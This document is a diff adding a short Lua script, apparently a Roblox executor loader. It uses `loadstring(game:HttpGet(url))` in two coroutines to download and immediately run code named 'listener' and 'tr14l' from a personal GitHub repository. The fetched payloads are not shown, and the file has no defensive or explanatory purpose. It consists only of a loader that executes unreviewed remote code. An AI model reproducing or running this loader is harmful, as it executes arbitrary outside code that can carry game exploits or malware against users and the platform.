@@ -1,0 +1,24 @@
+
+local function loadScript(url)
+    loadstring(game:HttpGet(url))()
+end
+ 
+-- Define the URLs
+local url1 = 'https://raw.githubusercontent.com/K4J7/tr1al/refs/heads/main/listener'
+local url2 = 'https://raw.githubusercontent.com/K4J7/tr1al/refs/heads/main/tr14l'
+
+ 
+-- Create coroutines for each loadstring
+local coroutine1 = coroutine.create(function()
+    loadScript(url1)
+end)
+ 
+local coroutine2 = coroutine.create(function()
+    loadScript(url2)
+end)
+
+
+ 
+-- Start both coroutines
+coroutine.resume(coroutine1)
+coroutine.resume(coroutine2)
